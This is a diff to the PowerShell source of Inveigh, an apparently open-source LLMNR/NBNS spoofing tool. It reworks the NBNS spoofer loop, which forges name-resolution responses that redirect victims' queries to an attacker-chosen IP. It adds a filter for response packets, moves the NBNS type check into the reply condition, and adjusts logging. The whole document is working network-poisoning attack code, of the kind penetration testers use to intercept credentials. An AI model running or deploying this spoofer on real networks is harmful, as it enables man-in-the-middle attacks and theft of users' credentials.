@@ -1269,7 +1269,7 @@ $LLMNR_spoofer_scriptblock =
                                 
             }
         
-            if($LLMNR_request_data -and $LLMNR_listener_endpoint.Address.IPAddressToString -ne '0.0.0.0')                   
+            if($LLMNR_request_data)                   
             {
                 $inveigh.console_queue.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")
                 $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")])
@@ -1294,92 +1294,92 @@ $NBNS_spoofer_scriptblock =
     while($inveigh.unprivileged_running)
     {
         $NBNS_request_data = $NBNS_UDP_client.Receive([Ref]$NBNS_listener_endpoint) # need to switch to async
-        $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)
-        [Array]::Reverse($NBNS_TTL_bytes)
 
-        $NBNS_response_packet = $NBNS_request_data[0,1] +
-                                0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
-                                $NBNS_request_data[13..$NBNS_request_data.Length] +
-                                $NBNS_TTL_bytes +
-                                0x00,0x06,0x00,0x00 +
-                                ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes() +
-                                0x00,0x00,0x00,0x00
-
-        $source_IP = $NBNS_listener_endpoint.Address.IPAddressToString
-        $NBNS_query_type = [System.BitConverter]::ToString($NBNS_request_data[43..44])
-                    
-        switch ($NBNS_query_type)
+        if([System.BitConverter]::ToString($NBNS_request_data[10..11]) -ne '00-01')
         {
+            $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)
+            [Array]::Reverse($NBNS_TTL_bytes)
 
-            '41-41'
+            $NBNS_response_packet = $NBNS_request_data[0,1] +
+                                    0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
+                                    $NBNS_request_data[13..$NBNS_request_data.Length] +
+                                    $NBNS_TTL_bytes +
+                                    0x00,0x06,0x00,0x00 +
+                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes() +
+                                    0x00,0x00,0x00,0x00
+
+            $source_IP = $NBNS_listener_endpoint.Address.IPAddressToString
+            $NBNS_query_type = [System.BitConverter]::ToString($NBNS_request_data[43..44])
+                    
+            switch ($NBNS_query_type)
             {
-                $NBNS_query_type = "00"
+
+                '41-41'
+                {
+                    $NBNS_query_type = "00"
+                }
+
+                '41-44'
+                {
+                    $NBNS_query_type = "03"
+                }
+
+                '43-41'
+                {
+                    $NBNS_query_type = "20"
+                }
+
+                '42-4C'
+                {
+                    $NBNS_query_type = "1B"
+                }
+
+                '42-4D'
+                {
+                    $NBNS_query_type = "1C"
+                }
+
+                '42-4E'
+                {
+                    $NBNS_query_type = "1D"
+                }
+
+                '42-4F'
+                {
+                    $NBNS_query_type = "1E"
+                }
+
             }
 
-            '41-44'
-            {
-                $NBNS_query_type = "03"
-            }
-
-            '43-41'
-            {
-                $NBNS_query_type = "20"
-            }
-
-            '42-4C'
-            {
-                $NBNS_query_type = "1B"
-            }
-
-            '42-4D'
-            {
-                $NBNS_query_type = "1C"
-            }
-
-            '42-4E'
-            {
-                $NBNS_query_type = "1D"
-            }
-
-            '42-4F'
-            {
-                $NBNS_query_type = "1E"
-            }
-
-        }
-
-        $NBNS_query = [System.BitConverter]::ToString($NBNS_request_data[13..($NBNS_request_data.Length - 4)])
-        $NBNS_query = $NBNS_query -replace "-00",""
-        $NBNS_query = $NBNS_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
-        $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
-        $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
-        $NBNS_query_string_subtracted = ""
-        $NBNS_query_string = ""
-        $n = 0
+            $NBNS_query = [System.BitConverter]::ToString($NBNS_request_data[13..($NBNS_request_data.Length - 4)])
+            $NBNS_query = $NBNS_query -replace "-00",""
+            $NBNS_query = $NBNS_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+            $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
+            $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
+            $NBNS_query_string_subtracted = ""
+            $NBNS_query_string = ""
+            $n = 0
                             
-        do
-        {
-            $NBNS_query_string_sub = (([Byte][Char]($NBNS_query_string_encoded.Substring($n,1))) - 65)
-            $NBNS_query_string_subtracted += ([System.Convert]::ToString($NBNS_query_string_sub,16))
-            $n += 1
-        }
-        until($n -gt ($NBNS_query_string_encoded.Length - 1))
+            do
+            {
+                $NBNS_query_string_sub = (([Byte][Char]($NBNS_query_string_encoded.Substring($n,1))) - 65)
+                $NBNS_query_string_subtracted += ([System.Convert]::ToString($NBNS_query_string_sub,16))
+                $n += 1
+            }
+            until($n -gt ($NBNS_query_string_encoded.Length - 1))
                     
-        $n = 0
+            $n = 0
                     
-        do
-        {
-            $NBNS_query_string += ([Char]([System.Convert]::ToInt16($NBNS_query_string_subtracted.Substring($n,2),16)))
-            $n += 2
-        }
-        until($n -gt ($NBNS_query_string_subtracted.Length - 1) -or $NBNS_query_string.Length -eq 15)
-
-        if($NBNSTypes -contains $NBNS_query_type)
-        {
+            do
+            {
+                $NBNS_query_string += ([Char]([System.Convert]::ToInt16($NBNS_query_string_subtracted.Substring($n,2),16)))
+                $n += 2
+            }
+            until($n -gt ($NBNS_query_string_subtracted.Length - 1) -or $NBNS_query_string.Length -eq 15)
                                  
             if (($NBNS_request_data -and $NBNS_listener_endpoint.Address.IPAddressToString -ne '255.255.255.255') -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $NBNS_query_string) -and (
             !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $NBNS_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and (
-            $inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP))
+            $inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP) -and ($NBNSTypes -contains $NBNS_query_type))
             {
                 $NBNS_destination_endpoint = New-Object System.Net.IPEndpoint($NBNS_listener_endpoint.Address,137)
                 $NBNS_UDP_client.Connect($NBNS_destination_endpoint)
@@ -1392,7 +1392,11 @@ $NBNS_spoofer_scriptblock =
             else
             {
 
-                if($SpooferHostsReply -and $SpooferHostsReply -notcontains $NBNS_query_string)
+                if($NBNSTypes -notcontains $NBNS_query_type)
+                {
+                    $NBNS_response_message = "- disabled NBNS type"
+                }
+                elseif($SpooferHostsReply -and $SpooferHostsReply -notcontains $NBNS_query_string)
                 {
                     $NBNS_response_message = "- $NBNS_query_string is not on reply list"
                 }
@@ -1419,19 +1423,15 @@ $NBNS_spoofer_scriptblock =
                                     
             }
 
-        }
-        else
-        {
-            $NBNS_response_message = "- disabled NBNS type"
-        }
-        
-        if($NBNS_request_data -and $NBNS_listener_endpoint.Address.IPAddressToString -ne '255.255.255.255')                   
-        {
-             $inveigh.console_queue.Add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")
-             $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")])
+            if($NBNS_request_data)                   
+            {
+                 $inveigh.console_queue.Add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")
+                 $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")])
+            }
+
+            $NBNS_request_data = ""
         }
 
-        $NBNS_request_data = ""
     }
 
     $NBNS_UDP_client.Close()
